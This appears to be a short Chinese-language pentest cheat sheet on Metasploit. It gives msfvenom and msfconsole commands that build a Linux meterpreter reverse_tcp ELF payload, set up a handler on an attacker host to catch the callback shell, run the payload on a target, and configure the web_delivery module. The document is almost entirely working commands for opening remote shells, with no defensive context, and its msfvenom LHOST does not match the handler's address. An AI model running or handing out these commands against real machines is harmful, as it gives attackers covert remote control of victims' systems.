## msf簇

---

- 攻击机 192.168.31.2
- 被攻击机 192.168.31.56

---

- msfvenom

  - 制作可执行文件

  ```shell
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=6666 -f elf > ubuntu.elf
  ```

  - msfconsole 进行运行，机器就可以上线

  ```shell
  msfconsole
  use exploit/multi/handler
  set payload linux/x64/meterpreter/reverse_tcp 
  set lhost 192.168.31.2
  set lport 6666
  run
  
  chmod +x ubuntu.elf
  ./ubuntu.elf 
  ```

- web_delivery--msfconsole
  ```shell
  use exploit/multi/script/web_delivery
  show targets
  set target 6　　 　　　　　　　　　　　　　　　　#Linux
  show payloads
  set payload 7　　　　　　　　　　　　　　　　　　#linux/x64/meterpreter/reverse_tcp
  set lhost 192.168.31.2
  run
  ```

  